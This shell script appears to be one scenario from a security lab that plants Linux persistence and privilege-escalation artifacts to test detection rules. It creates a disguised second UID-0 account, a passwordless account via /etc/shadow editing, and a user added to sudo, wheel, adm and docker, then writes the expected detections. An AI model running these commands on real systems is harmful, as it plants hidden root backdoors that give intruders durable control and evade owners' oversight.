#!/bin/sh
# 05_privilege_escalation.sh — MITRE T1136 Create Account / T1548 Abuse
#   Elevation / T1098 Account Manipulation
#
# REAL-LIFE STORY
#   After gaining a foothold, an attacker makes their access durable and
#   powerful: a second UID-0 account (a "hidden root"), an account with no
#   password, and adding a controlled user to sudo/docker/adm. Each of these
#   is a persistent privilege-escalation primitive that survives a password
#   reset on the original account.
#
# WHAT IS GENUINE
#   ALL of it. These are real mutations to /etc/passwd, /etc/shadow, /etc/group
#   via the real system tools. This is exactly what the real technique does.
#
# DETECTION LAYER (four rules — this is the richest rule-backed scenario)
#   uid0_account, passwordless_account, privileged_group_member,
#   new_account_privilege_grant  (all findings).
#
# REPRODUCIBLE: YES, fully. High blast radius — SNAPSHOT FIRST.

set -e
DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
. "$DIR/lib.sh"
require_root "05_privilege_escalation"
confirm_lab

HIDDEN_ROOT="${LFA_HIDDEN_ROOT:-sysmon}"    # looks like a monitoring daemon
NOPASS_USER="${LFA_NOPASS_USER:-svc_backup}"
GRANT_USER="${LFA_GRANT_USER:-helpdesk}"

echo "[*] 1/4 Creating a SECOND UID-0 account '$HIDDEN_ROOT' (hidden root)..."
# Hardy's useradd (shadow 4.x, coreutils 6.10 on Metasploitable) has NO
# -M/--no-create-home flag — passing it aborts with a usage error. Add it only
# where supported so the "daemon-like, no home" shape survives on modern boxes
# while Hardy just gets the account (a home dir there is harmless cosmetics).
NOHOME=""
if useradd --help 2>&1 | grep -q -- '-M'; then NOHOME="-M"; fi
if ! id "$HIDDEN_ROOT" >/dev/null 2>&1; then
    useradd -o -u 0 -g 0 $NOHOME -s /bin/bash "$HIDDEN_ROOT"
fi

echo "[*] 2/4 Creating a PASSWORDLESS account '$NOPASS_USER'..."
if ! id "$NOPASS_USER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$NOPASS_USER"
fi
passwd -d "$NOPASS_USER" >/dev/null 2>&1 || \
    sed -i "s/^\($NOPASS_USER\):[^:]*:/\1::/" /etc/shadow

echo "[*] 3/4 Creating '$GRANT_USER' and granting privileged group membership..."
if ! id "$GRANT_USER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$GRANT_USER"
fi
for grp in sudo wheel adm docker; do
    getent group "$grp" >/dev/null 2>&1 && usermod -aG "$grp" "$GRANT_USER" 2>/dev/null || true
done

echo "[*] 4/4 (auth.log already records useradd/usermod for the grant rule)."

write_ground_truth "$DIR/05_privilege_escalation.ground_truth.json" \
  "privilege_escalation" \
  '[
    {"threat_id":"T1136_uid0","name":"Second UID-0 account",
     "expected_rule":"uid0_account","detection_layer":"finding",
     "details":"'"$HIDDEN_ROOT"' has uid=0 but is not root",
     "verify":"awk -F: (\$3==0){print \$1} /etc/passwd"},
    {"threat_id":"T1078_nopass","name":"Passwordless account",
     "expected_rule":"passwordless_account","detection_layer":"finding",
     "details":"'"$NOPASS_USER"' has an empty password field in /etc/shadow",
     "verify":"awk -F: (\$2==\"\"){print \$1} /etc/shadow"},
    {"threat_id":"T1098_priv_group","name":"Privileged group membership granted",
     "expected_rule":"privileged_group_member","detection_layer":"finding",
     "details":"'"$GRANT_USER"' added to sudo/wheel/adm/docker",
     "verify":"getent group sudo wheel adm docker"},
    {"threat_id":"T1136_new_grant","name":"New account + privilege grant",
     "expected_rule":"new_account_privilege_grant","detection_layer":"finding",
     "details":"account created then added to a privileged group (auth.log)",
     "verify":"grep -E \"useradd|usermod|groupadd\" /var/log/auth.log"}
  ]'
echo "[+] Scenario 05 complete. Created: $HIDDEN_ROOT (uid0), $NOPASS_USER (nopass), $GRANT_USER (groups)."
